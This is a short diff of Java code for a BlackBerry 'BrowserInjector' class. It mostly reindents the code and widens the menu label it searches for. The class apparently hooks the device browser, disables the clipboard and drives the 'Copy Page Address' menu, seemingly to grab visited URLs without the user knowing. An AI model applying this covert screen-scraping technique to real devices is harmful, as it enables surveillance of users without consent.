@@ -19,18 +19,20 @@ public class BrowserInjector extends UrlGroupInjector {
     //#endif
 
     public String getAppName() {
-      //TODO: in messages
+        //TODO: in messages
         return "Browser";
     }
 
     public String getCodName() {
-      //TODO: in messages
+        //TODO: in messages
         return "net_rim_bb_browser_daemon";
     }
 
     public String[] getWantedScreen() {
         //TODO: in messages
-        return new String[] { "net.rim.device.apps.internal.browser.page.BrowserScreen", "net.rim.device.apps.internal.browser.ui.BrowserScreen" };
+        return new String[] {
+                "net.rim.device.apps.internal.browser.page.BrowserScreen",
+                "net.rim.device.apps.internal.browser.ui.BrowserScreen" };
     }
 
     public void playOnScreen(Screen screen) {
@@ -46,7 +48,7 @@ public class BrowserInjector extends UrlGroupInjector {
     }
 
     public void urlByContext(Screen screen) {
-      //TODO: in messages
+        //TODO: in messages
         String menuName = "Copy Page Address";
         BrowserMenu menu = new BrowserMenu(this, menuName);
         menu.addMenu();
@@ -63,8 +65,8 @@ public class BrowserInjector extends UrlGroupInjector {
         debug.trace("playOnScreen: " + screen);
         //#endif    
 
-      //TODO: in messages
-        String menuName = "Copy Page Address";
+        //TODO: in messages
+        String[] menuName = new String[] {"Copy Page Address", "Copy Address"};
 
         disableClipboard();
         boolean ret = MenuWalker.walk(menuName, screen, true);
